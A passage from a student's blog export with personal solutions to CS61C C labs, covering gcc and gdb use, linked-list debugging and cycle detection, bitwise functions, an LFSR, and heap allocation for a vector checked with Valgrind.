<p><strong>Answer is -2, which is correct.</strong></p>
]]></content>
      <categories>
        <category>CS61C</category>
      </categories>
      <tags>
        <tag>Machine Structure</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61c-lab01</title>
    <url>/2018/09/25/cs61c-lab01/</url>
    <content><![CDATA[<h1 id="Compiling-and-Running-a-C-Program"><a href="#Compiling-and-Running-a-C-Program" class="headerlink" title="Compiling and Running a C Program"></a>Compiling and Running a C Program</h1><p>In this lab, we will be using the command line program gcc to compile programs in C. The simplest way to run gcc is as follows (note that there is no file called program.c given in the lab files, this is just an example for your information).</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc program.c</span><br></pre></td></tr></table></figure>
<p>This compiles program.c into an executable file named a.out. This file can be run with the following command.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;a.out</span><br></pre></td></tr></table></figure>

<a id="more"></a>
<p>gcc has various command line options which you are encouraged to explore. In this lab, however, we will only be using -o, which is used to specify the name of the executable file that gcc creates. Using -o, you would use the following commands to compile program.c into a program named program, and then run it.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc -o program program.c</span><br><span class="line">$ .&#x2F;program</span><br></pre></td></tr></table></figure>
<h1 id="Exercise-1-Simple-C-Program"><a href="#Exercise-1-Simple-C-Program" class="headerlink" title="Exercise 1: Simple C Program"></a>Exercise 1: Simple C Program</h1><p>In this exercise, we will see an example of preprocessor macro definitions. Macros can be a messy topic, but in general the way they work is that before a C file is compiled, all macro constant names are replaced exactly with the value they refer to.</p>
<p>In the scope of this exercise, we will be using macro definitions exclusively as global constants. Here we define CONSTANT_NAME to refer to literal_value (an integer literal). Note that there is only a space separating name from value.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONSTANT_NAME literal_value</span></span><br></pre></td></tr></table></figure>
<p>Now, look at the code contained in <a href="http://inst.eecs.berkeley.edu/~cs61c/sp15/labs/01/eccentric.c" target="_blank" rel="noopener">eccentric.c</a>. We see four different examples of basic C control flow. First compile and run the program to see what it does. Play around with the constant values of the four macro: V0 through V3. See how changing them changes the program output. Modifying only these four values, make the program produce the following output.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc -o eccentric eccentric.c</span><br><span class="line">$ .&#x2F;eccentric</span><br><span class="line">Berkeley eccentrics:</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Happy Happy Happy</span><br><span class="line">Yoshua</span><br><span class="line"></span><br><span class="line">Go BEARS!</span><br></pre></td></tr></table></figure>
<p>There are actually several different combinations of values that can give this output. You should consider what is the minimum number of different values V0 through V3 can have to give this same output. The maximum is four, when they are all distinct from each other.</p>
<h1 id="Debugger"><a href="#Debugger" class="headerlink" title="Debugger"></a>Debugger</h1><p><a href="http://inst.eecs.berkeley.edu/~cs61c/resources/gdb5-refcard.pdf" target="_blank" rel="noopener">GDB reference card</a></p>
<ul>
<li><p>How do you set a breakpoint which only occurs when a set of conditions is true (e.g. when certain variables are a certain value)?</p>
</li>
<li><p>How do you execute the next line of C code in the program after stopping at a breakpoint?</p>
</li>
<li><p>If the next line of code is a function call, you’ll execute the whole function call at once if you use your answer to #3. How do you tell GDB that you want to debug the code inside the function instead?</p>
</li>
<li><p>How do you resume the program after stopping at a breakpoint?</p>
</li>
<li><p>How can you see the value of a variable (or even an expression like 1+2) in gdb?</p>
</li>
<li><p>How do you configure gdb so it prints the value of a variable after every step?</p>
</li>
<li><p>How do you print a list of all variables and their values in the current function?</p>
</li>
<li><p>How do you exit out of gdb?</p>
</li>
</ul>
<h1 id="Exercise-3-Debugging-a-buggy-C-program"><a href="#Exercise-3-Debugging-a-buggy-C-program" class="headerlink" title="Exercise 3: Debugging a buggy C program"></a>Exercise 3: Debugging a buggy C program</h1><p>You will now use your newly acquired gdb knowledge to debug a short C program! Consider the program <a href="http://inst.eecs.berkeley.edu/~cs61c/sp15/labs/01/ll_equal.c" target="_blank" rel="noopener">ll_equal.c</a>. Compile and run the program, and experiment with it. It will give you the following result:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc -g -o ll_equal ll_equal.c</span><br><span class="line">$ .&#x2F;ll_equal</span><br><span class="line">equal test 1 result &#x3D; 1</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<p>Now, start gdb on the program, following the instructions in exercise 1. Set a breakpoint in the ll_equal() function, and run the program. When the debugger returns at the breakpoint, step through the instructions in the function line by line, and examine the values of the variables. Pay attention to the pointers a and b in the function. Are they always pointed to the right address? Find the bug and fix it.</p>
<p><strong>By debugging we find that during the second function call, there seems to be have a situation that we want b’s value when b is null!This is null pointer reference, which seems to be totally wrong.So we need to determin whether a or b is null, then compare value with each other.</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; node;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">FIXME:</span> this function is buggy. */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ll_equal</span><span class="params">(<span class="keyword">const</span> node* a, <span class="keyword">const</span> node* b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (a != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (b == <span class="literal">NULL</span> || a-&gt;val != b-&gt;val)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		a = a-&gt;next;</span><br><span class="line">		b = b-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* lists are equal if a and b are both null */</span></span><br><span class="line">	<span class="keyword">return</span> a == b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	node nodes[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">		nodes[i].val = <span class="number">0</span>;</span><br><span class="line">		nodes[i].next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	nodes[<span class="number">0</span>].next = &amp;nodes[<span class="number">1</span>];</span><br><span class="line">	nodes[<span class="number">1</span>].next = &amp;nodes[<span class="number">2</span>];</span><br><span class="line">	nodes[<span class="number">2</span>].next = &amp;nodes[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"equal test 1 result = %d\n"</span>, ll_equal(&amp;nodes[<span class="number">0</span>], &amp;nodes[<span class="number">0</span>]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"equal test 2 result = %d\n"</span>, ll_equal(&amp;nodes[<span class="number">0</span>], &amp;nodes[<span class="number">2</span>]));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Exercise-4-Pointers-and-Structures-in-C"><a href="#Exercise-4-Pointers-and-Structures-in-C" class="headerlink" title="Exercise 4: Pointers and Structures in C"></a>Exercise 4: Pointers and Structures in C</h1><p>Here’s one to help you in your interviews. In <a href="http://inst.eecs.berkeley.edu/~cs61c/sp15/labs/01/ll_cycle.c" target="_blank" rel="noopener">ll_cycle.c</a>, complete the function ll_has_cycle() to implement the following algorithm for checking if a singly-linked list has a cycle.</p>
<p>Start with two pointers at the head of the list. We’ll call the first one tortoise and the second one hare.<br>Advance hare by two nodes. If this is not possible because of a null pointer, we have found the end of the list, and therefore the list is acyclic.<br>Advance tortoise by one node. (A null pointer check is unnecessary. Why?)<br>If tortoise and hare point to the same node, the list is cyclic. Otherwise, go back to step 2.<br>After you have correctly implemented ll_has_cycle(), the program you get when you compile ll_cycle.c will tell you that ll_has_cycle() agrees with what the program expected it to output.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> value;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ll_has_cycle</span><span class="params">(node *head)</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* your code here */</span></span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	node *tortoise = head;</span><br><span class="line">	node *hare = head;</span><br><span class="line">	<span class="keyword">while</span> (hare -&gt; next != <span class="literal">NULL</span> &amp;&amp; hare -&gt; next -&gt; next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		tortoise = tortoise -&gt; next;</span><br><span class="line">		hare = hare -&gt; next -&gt; next;</span><br><span class="line">		<span class="keyword">if</span> (tortoise == hare) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_ll_has_cycle</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	node nodes[<span class="number">25</span>]; <span class="comment">//enough to run our tests</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(nodes)/<span class="keyword">sizeof</span>(node); i++) &#123;</span><br><span class="line">		nodes[i].next = <span class="number">0</span>;</span><br><span class="line">		nodes[i].value = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nodes[<span class="number">0</span>].next = &amp;nodes[<span class="number">1</span>];</span><br><span class="line">	nodes[<span class="number">1</span>].next = &amp;nodes[<span class="number">2</span>];</span><br><span class="line">	nodes[<span class="number">2</span>].next = &amp;nodes[<span class="number">3</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Checking first list for cycles. There should be none, ll_has_cycle says it has %s cycle\n"</span>, ll_has_cycle(&amp;nodes[<span class="number">0</span>])?<span class="string">"a"</span>:<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">	nodes[<span class="number">4</span>].next = &amp;nodes[<span class="number">5</span>];</span><br><span class="line">	nodes[<span class="number">5</span>].next = &amp;nodes[<span class="number">6</span>];</span><br><span class="line">	nodes[<span class="number">6</span>].next = &amp;nodes[<span class="number">7</span>];</span><br><span class="line">	nodes[<span class="number">7</span>].next = &amp;nodes[<span class="number">8</span>];</span><br><span class="line">	nodes[<span class="number">8</span>].next = &amp;nodes[<span class="number">9</span>];</span><br><span class="line">	nodes[<span class="number">9</span>].next = &amp;nodes[<span class="number">10</span>];</span><br><span class="line">	nodes[<span class="number">10</span>].next = &amp;nodes[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Checking second list for cycles. There should be a cycle, ll_has_cycle says it has %s cycle\n"</span>, ll_has_cycle(&amp;nodes[<span class="number">4</span>])?<span class="string">"a"</span>:<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">	nodes[<span class="number">11</span>].next = &amp;nodes[<span class="number">12</span>];</span><br><span class="line">	nodes[<span class="number">12</span>].next = &amp;nodes[<span class="number">13</span>];</span><br><span class="line">	nodes[<span class="number">13</span>].next = &amp;nodes[<span class="number">14</span>];</span><br><span class="line">	nodes[<span class="number">14</span>].next = &amp;nodes[<span class="number">15</span>];</span><br><span class="line">	nodes[<span class="number">15</span>].next = &amp;nodes[<span class="number">16</span>];</span><br><span class="line">	nodes[<span class="number">16</span>].next = &amp;nodes[<span class="number">17</span>];</span><br><span class="line">	nodes[<span class="number">17</span>].next = &amp;nodes[<span class="number">14</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Checking third list for cycles. There should be a cycle, ll_has_cycle says it has %s cycle\n"</span>, ll_has_cycle(&amp;nodes[<span class="number">11</span>])?<span class="string">"a"</span>:<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">	nodes[<span class="number">18</span>].next = &amp;nodes[<span class="number">18</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Checking fourth list for cycles. There should be a cycle, ll_has_cycle says it has %s cycle\n"</span>, ll_has_cycle(&amp;nodes[<span class="number">18</span>])?<span class="string">"a"</span>:<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">	nodes[<span class="number">19</span>].next = &amp;nodes[<span class="number">20</span>];</span><br><span class="line">	nodes[<span class="number">20</span>].next = &amp;nodes[<span class="number">21</span>];</span><br><span class="line">	nodes[<span class="number">21</span>].next = &amp;nodes[<span class="number">22</span>];</span><br><span class="line">	nodes[<span class="number">22</span>].next = &amp;nodes[<span class="number">23</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Checking fifth list for cycles. There should be none, ll_has_cycle says it has %s cycle\n"</span>, ll_has_cycle(&amp;nodes[<span class="number">19</span>])?<span class="string">"a"</span>:<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Checking length-zero list for cycles. There should be none, ll_has_cycle says it has %s cycle\n"</span>, ll_has_cycle(<span class="literal">NULL</span>)?<span class="string">"a"</span>:<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  test_ll_has_cycle();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61C</category>
      </categories>
      <tags>
        <tag>Machine Structure</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61c-lab02</title>
    <url>/2018/10/12/cs61c-lab02/</url>
    <content><![CDATA[<h1 id="Exercise-1-Bit-Operations"><a href="#Exercise-1-Bit-Operations" class="headerlink" title="Exercise 1: Bit Operations"></a>Exercise 1: Bit Operations</h1><p>For this exercise, you will complete <code>bit_ops.c</code> by implementing the following three bit manipulation functions. You will want to use bitwise operations such as and (&amp;), or (|), xor (^), not (~), left shifts (&lt;&lt;), and right shifts (&gt;&gt;). Avoid using any loops or conditional statements.</p>
<a id="more"></a>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Return the nth bit of x.</span></span><br><span class="line"><span class="comment">// Assume 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">get_bit</span><span class="params">(<span class="keyword">unsigned</span> x,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">unsigned</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the nth bit of the value of x to v.</span></span><br><span class="line"><span class="comment">// Assume 0 &lt;= n &lt;= 31, and v is 0 or 1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_bit</span><span class="params">(<span class="keyword">unsigned</span> * x,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">unsigned</span> n,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">unsigned</span> v)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flip the nth bit of the value of x.</span></span><br><span class="line"><span class="comment">// Assume 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flip_bit</span><span class="params">(<span class="keyword">unsigned</span> * x,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">unsigned</span> n)</span></span>;</span><br></pre></td></tr></table></figure>
<p>Once you complete these functions, you can compile and run your code using the following commands.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ make bit_ops</span><br><span class="line">$ .&#x2F;bit_ops</span><br></pre></td></tr></table></figure>
<p>This will print out the result of a few limited tests.</p>
<p>Checkoff [1/3]</p>
<ul>
<li>Show how you implemented get, set, and flip.</li>
<li>Show the output of running the tests.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Return the nth bit of x.</span></span><br><span class="line"><span class="comment">// Assume 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">get_bit</span><span class="params">(<span class="keyword">unsigned</span> x,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">unsigned</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">    <span class="comment">// Returning -1 is a placeholder (it makes</span></span><br><span class="line">    <span class="comment">// no sense, because get_bit only returns</span></span><br><span class="line">    <span class="comment">// 0 or 1)</span></span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; n) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Set the nth bit of the value of x to v.</span></span><br><span class="line"><span class="comment">// Assume 0 &lt;= n &lt;= 31, and v is 0 or 1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_bit</span><span class="params">(<span class="keyword">unsigned</span> * x,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">unsigned</span> n,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">unsigned</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">    <span class="keyword">int</span> mask = <span class="number">1</span> &lt;&lt; n;</span><br><span class="line">    (v == <span class="number">1</span>) ? (*x) |= mask : ((*x) &amp;= (~mask));</span><br><span class="line">    <span class="comment">// Or (* x) = ((* x) &amp; (0xFFFFFFFF - (1 &lt;&lt; n))) + (v &lt;&lt; n);</span></span><br><span class="line">    <span class="comment">// Make that bit to be manipulated to zero, then plus the v bit.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Flip the nth bit of the value of x.</span></span><br><span class="line"><span class="comment">// Assume 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flip_bit</span><span class="params">(<span class="keyword">unsigned</span> * x,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">unsigned</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">    (*x) ^= (<span class="number">1</span> &lt;&lt; n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Exercise-2-Linear-feedback-shift-register"><a href="#Exercise-2-Linear-feedback-shift-register" class="headerlink" title="Exercise 2: Linear feedback shift register"></a>Exercise 2: Linear feedback shift register</h1><p>In this exercise, you will implement a lfsr_calculate() function to compute the next iteration of a linear feedback shift register (LFSR). Applications that use LFSRs are: Digital TV, CDMA cellphones, Ethernet, USB 3.0, and more! This function will generate pseudo-random numbers using bitwise operators. For some more background, read the Wikipedia article on Linear feedback shift registers. In lfsr.c, fill in the function lfsr_calculate() so that it does the following:</p>
<h2 id="Hardware-diagram-see-explanation-below"><a href="#Hardware-diagram-see-explanation-below" class="headerlink" title="Hardware diagram(see explanation below)"></a>Hardware diagram(see explanation below)</h2>

<h2 id="Explanation-of-the-above-diagram"><a href="#Explanation-of-the-above-diagram" class="headerlink" title="Explanation of the above diagram"></a>Explanation of the above diagram</h2><ul>
<li>On each call to lfsr_calculate, you will shift the contents of the register 1 bit to the right.</li>
<li>This shift is neither a logical shift or an arithmetic shift. On the left side, you will shift in a single bit equal to the Exclusive Or (XOR) of the bits originally in position 11, 13, 14, and 16.</li>
<li>The curved head-light shaped object is an XOR, which takes two inputs (a, b) and outputs a^b.</li>
<li>If you implemented lfsr_calculate() correctly, it should output all 65535 positive 16-bit integers before cycling back to the starting number.</li>
</ul>
<p>After you have correctly implemented lfsr_calculate(), compile lfsr and run it. Your output should be similar to the following:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ make lfsr</span><br><span class="line">$ .&#x2F;lfsr</span><br><span class="line">My number is: 1</span><br><span class="line">My number is: 5185</span><br><span class="line">My number is: 38801</span><br><span class="line">My number is: 52819</span><br><span class="line">My number is: 21116</span><br><span class="line">My number is: 54726</span><br><span class="line">My number is: 26552</span><br><span class="line">My number is: 46916</span><br><span class="line">My number is: 41728</span><br><span class="line">My number is: 26004</span><br><span class="line">My number is: 62850</span><br><span class="line">My number is: 40625</span><br><span class="line">My number is: 647</span><br><span class="line">My number is: 12837</span><br><span class="line">My number is: 7043</span><br><span class="line">My number is: 26003</span><br><span class="line">My number is: 35845</span><br><span class="line">My number is: 61398</span><br><span class="line">My number is: 42863</span><br><span class="line">My number is: 57133</span><br><span class="line">My number is: 59156</span><br><span class="line">My number is: 13312</span><br><span class="line">My number is: 16285</span><br><span class="line"> ... etc etc ...</span><br><span class="line">Got 65535 numbers before cycling!</span><br><span class="line">Congratulations! It works!</span><br></pre></td></tr></table></figure>

<p>Checkoff [2/3]</p>
<ul>
<li>Show how you implemented your lfsr_calculate function.</li>
<li>Show the output from running ./lfsr.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lfsr_calculate</span><span class="params">(<span class="keyword">uint16_t</span> *reg)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* YOUR CODE HERE */</span></span><br><span class="line">  <span class="keyword">uint16_t</span> <span class="built_in">bit</span> = ((*reg) &gt;&gt; <span class="number">0</span>) ^ ((*reg) &gt;&gt; <span class="number">2</span>) ^ ((*reg) &gt;&gt; <span class="number">3</span>) ^ ((*reg) &gt;&gt; <span class="number">5</span>);</span><br><span class="line">  *reg = (*reg &gt;&gt; <span class="number">1</span>) | (<span class="built_in">bit</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>I wrote the answer according to <a href="https://en.wikipedia.org/wiki/Linear-feedback_shift_register" target="_blank" rel="noopener">wiki</a></p>
<h1 id="Exercise-3-Memory-Management"><a href="#Exercise-3-Memory-Management" class="headerlink" title="Exercise 3: Memory Management"></a>Exercise 3: Memory Management</h1><p>This exercise uses vector.h, vector-test.c, and vector.c, where we provide you with a framework for implementing a variable-length array. This exercise is designed to help familiarize you with C structs and memory management in C.</p>
<p><strong>Your task is to explain why the two functions bad_vector_new() and also_bad_vector_new() are bad and fill in the functions vector_new(), vector_get(), vector_delete(), and vector_set() in vector.c so that our test code vector-test.c runs without any memory management errors.</strong> Comments in the code describe how the functions should work. Look at the functions we’ve filled in to see how the data structures should be used. For consistency, it is assumed that all entries in the vector are 0 unless set by the user. Keep this in mind as malloc() does not zero out the memory it allocates.</p>
<p>For explaining why the two bad functions are incorrect, keep in mind that one of these functions will actually run correctly (assuming correctly modified vector_new, vector_set, etc.) but there may be other problems; hint: think about memory usage.</p>
<h2 id="Using-Valgrind"><a href="#Using-Valgrind" class="headerlink" title="Using Valgrind"></a>Using Valgrind</h2><p>To help you to find memory bugs, we have installed a copy of Valgrind Memcheck. Valgrind is ONLY on the lab machines in the Hive and the Orchard. This program will run an executable while keeping track of what registers and regions of memory contain allocated and/or initialized values. The program will run much slower (by a factor of about 10 to 50) so that this information can be collected, but Valgrind Memcheck can identify many memory errors automatically at the point at which they are produced. You will need to learn the basics of how to parse the Valgrind output.</p>
<p>You can test your code in the following two ways:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 1) to check functionality:</span><br><span class="line">$ make vector-test</span><br><span class="line">$ ./vector-test</span><br><span class="line"></span><br><span class="line">// 2) to check memory management using Valgrind:</span><br><span class="line">$ make vector-memcheck</span><br></pre></td></tr></table></figure>
<p>The Makefile calls Valgrind as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ valgrind --tool&#x3D;memcheck --leak-check&#x3D;full --track-origins&#x3D;yes [OS SPECIFIC ARGS] .&#x2F;&lt;executable&gt;</span><br></pre></td></tr></table></figure>
<p>The –track-origins flag attempts to identify the sources of unitialized values. The –leak-check=full option tries to identify memory leaks. [OS SPECIFIC ARGS] are simply a set of arguments to Valgrind that differ across operating systems (in our case, Ubuntu (Linux)). If you are interested in learning more about these, see the Makefile.</p>
<p>The last line in the Valgrind output is the line that will indicate at a glance if things have gone wrong. Here’s a sample output from a buggy program:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;47132&#x3D;&#x3D; ERROR SUMMARY: 1200039 errors from 24 contexts (suppressed: 18 from 18)</span><br></pre></td></tr></table></figure>
<p>If your program has errors, you can scroll up in the command line output to view details for each one. For our purposes, you can safely ignore all output that refers to suppressed errors. In a leak-free program, your output will look like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;44144&#x3D;&#x3D; ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 18 from 18)</span><br></pre></td></tr></table></figure>
<p>Again, any number of suppressed errors is fine; they do not affect us.</p>
<p>Feel free to also use a debugger or add printf statements to vector.c and vector-test.c to debug your code.</p>
<p>Checkoff [3/3]<br>Show your modifications to vector.c.<br>Show the output from running make vector-memcheck.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Bad example of how to create a new vector */</span></span><br><span class="line"><span class="comment">/* v is allocated in stack so when the function exits stack, the retval pointer may poinnt to garbage*/</span></span><br><span class="line"><span class="function"><span class="keyword">vector_t</span> *<span class="title">bad_vector_new</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* Create the vector and a pointer to it */</span></span><br><span class="line">	<span class="keyword">vector_t</span> *retval, v;</span><br><span class="line">	retval = &amp;v;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize attributes */</span></span><br><span class="line">	retval-&gt;<span class="built_in">size</span> = <span class="number">1</span>;</span><br><span class="line">	retval-&gt;data = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">if</span> (retval-&gt;data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		allocation_failed();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	retval-&gt;data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Another suboptimal way of creating a vector */</span></span><br><span class="line"><span class="comment">/* This is bad also because the v variable is allocated in stack. When function is returned ,the stack memory will be recycled.(Maybe I think) */</span></span><br><span class="line"><span class="function"><span class="keyword">vector_t</span> <span class="title">also_bad_vector_new</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* Create the vector */</span></span><br><span class="line">	<span class="keyword">vector_t</span> v;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize attributes */</span></span><br><span class="line">	v.<span class="built_in">size</span> = <span class="number">1</span>;</span><br><span class="line">	v.data = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">if</span> (v.data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		allocation_failed();</span><br><span class="line">	&#125;</span><br><span class="line">	v.data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Create a new vector with a size (length) of 1</span></span><br><span class="line"><span class="comment">   and set its single component to zero... the</span></span><br><span class="line"><span class="comment">   RIGHT WAY */</span></span><br><span class="line"><span class="function"><span class="keyword">vector_t</span> *<span class="title">vector_new</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* Declare what this function will return */</span></span><br><span class="line">	<span class="keyword">vector_t</span> *retval;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* First, we need to allocate memory on the heap for the struct */</span></span><br><span class="line">	retval = <span class="comment">/* YOUR CODE HERE */</span>(<span class="keyword">vector_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">vector_t</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check our return value to make sure we got memory */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="comment">/* YOUR CODE HERE */</span>retval == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		allocation_failed();</span><br><span class="line">	